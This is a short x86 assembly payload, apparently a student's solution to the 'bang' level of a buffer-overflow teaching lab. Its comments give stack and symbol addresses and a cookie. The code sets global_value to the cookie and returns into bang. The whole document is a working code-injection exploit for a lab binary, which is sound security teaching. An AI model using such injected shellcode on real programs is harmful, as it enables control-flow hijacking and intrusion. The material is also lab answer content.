# stack frame base of getbuf is at 0x556836b0 (%ebp)
# symtab: 0804d1e8 B global_value
# Cookie: 0x60f73576
# 08049446 <bang>
# str start value -0x42(%ebp)

movl $0x0804d1e8,%eax # addr of global_value
movl $0x60f73576,(%eax) # set global value = cookie
push $0x08049446 # addr of bang
ret